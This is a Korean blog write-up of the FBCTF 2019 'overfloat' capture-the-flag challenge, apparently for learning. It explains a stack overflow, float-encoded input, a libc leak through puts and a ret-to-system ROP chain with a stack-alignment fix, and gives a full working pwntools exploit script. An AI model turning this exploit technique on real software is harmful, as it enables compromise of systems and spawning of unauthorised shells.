---
title: FBCTF 2019 - overfloat
categories:
 - pwnable
tags: float, stackoverflow, rop
---

```sh
                                 _ .--.        
                                ( `    )       
                             .-'      `--,     
                  _..----.. (             )`-. 
                .'_|` _|` _|(  .__,           )
               /_|  _|  _|  _(        (_,  .-' 
              ;|  _|  _|  _|  '-'__,--'`--'    
              | _|  _|  _|  _| |               
          _   ||  _|  _|  _|  _|               
        _( `--.\_|  _|  _|  _|/               
     .-'       )--,|  _|  _|.`                 
    (__, (_      ) )_|  _| /                   
      `-.__.\ _,--'\|__|__/                  
                    ;____;                     
                     \YT/                     
                      ||                       
                     |""|                    
                     '=='                      

WHERE WOULD YOU LIKE TO GO?
```
- Introduction
- Vunlnerability
- Exploit
- slv.py
- 느낀 점
- Reference



## Introduction

facebook ctf !

float와 관련된 문제다.

## Vunlnerability

`chart_course`에서 done을 입력하기 전까지 계속 입력을 받게되는데 이때 main함수의 stack frame에서 stack overflow가 발생한다.


## Exploit

입력은 8byte씩, `atof` 함수를 거치고 나서 원하는 값을 넣을 수 있게 만들어야 되기 때문에 payload를 짤 때 생각을 좀 해야된다.

그리고 `fgets`함수의 3번째 인자로 `stdin`을 넣어줘야되는데 주소를 알 수 없으므로 main함수로 다시 돌아가서 leak 후에 shell을 땄다.

## slv.py


```python
from pwn import *
import struct

p = process('./overfloat')
e = ELF('./overfloat')


sla = lambda s,c : p.sendlineafter(s, str(c))
upf = lambda s : struct.unpack('<f', s)[0]
_p32 = lambda s : str(upf(p32(s)))

puts_got = e.got['puts']
puts_plt = e.plt['puts']
pr_addr = 0x00400a83
system_offset = 0x4f4e0
binsh_offset = 0x1b40fa
puts_offset = 0x80a30
main_addr = 0x400993
ret_addr = 0x400a1f


def main():
    
    for i in range(14):
        sla(': ', _p32(1234))
        
    
    sla(': ', _p32(pr_addr))
    sla(': ', _p32(0))
    
    sla(': ', _p32(puts_got))
    sla(': ', _p32(0))
    
    sla(': ', _p32(puts_plt))
    sla(': ', _p32(0))
    
    sla(': ', _p32(main_addr))
    sla(': ', _p32(0))

    sla(': ', 'done')
    
    p.recvuntil('!\n')
    puts_addr = u64(p.recv(6).ljust(8,'\x00'))
    log.info('puts_addr : ' + hex(puts_addr))
    
    libc_base = puts_addr - puts_offset
    binsh_addr = libc_base + binsh_offset
    system_addr = libc_base + system_offset
    
    for i in range(14):
        sla(': ', _p32(1234))
    
    sla(': ', _p32(ret_addr)) # rsp align
    sla(': ', _p32(0))
    
    sla(': ', _p32(pr_addr))
    sla(': ', _p32(0))
    
    sla(': ', _p32(binsh_addr & 0xffffffff))
    sla(': ', _p32(binsh_addr >>32))
    
    sla(': ', _p32(system_addr & 0xffffffff))
    sla(': ', _p32(system_addr >>32))
    
    sla(': ', 'done')
    
    p.interactive()
    
    return


if __name__ == '__main__':
    main()

```

추가적으로 신경 써줘야 될 것은 `system`함수 중에 `<do_system+1094>: movaps XMMWORD PTR [rsp+0x40],xmm0` 부분이 있다.

`movaps`명령어는 피연산자(`[rsp+0x40]`)의 값이 16byte로 정렬 즉, 뒷부분이 0이 되어야 된다. 갑자기 segfault 떠서 좀 당황했다.. ㅎㅎ..;;

payload에 ret을 하나 더 넣어서 rsp += 0x8을 진행해서 정렬시켰다.


## 느낀 점

실력이 하아아아아안참 부족하다... 정진하자.

## Reference

- [https://c9x.me/x86/html/file_module_x86_id_180.html](https://c9x.me/x86/html/file_module_x86_id_180.html)
- [https://reverseengineering.stackexchange.com/questions/21503/unexpected-segfault-when-theres-apparently-nothing-that-would-cause-it](https://reverseengineering.stackexchange.com/questions/21503/unexpected-segfault-when-theres-apparently-nothing-that-would-cause-it)
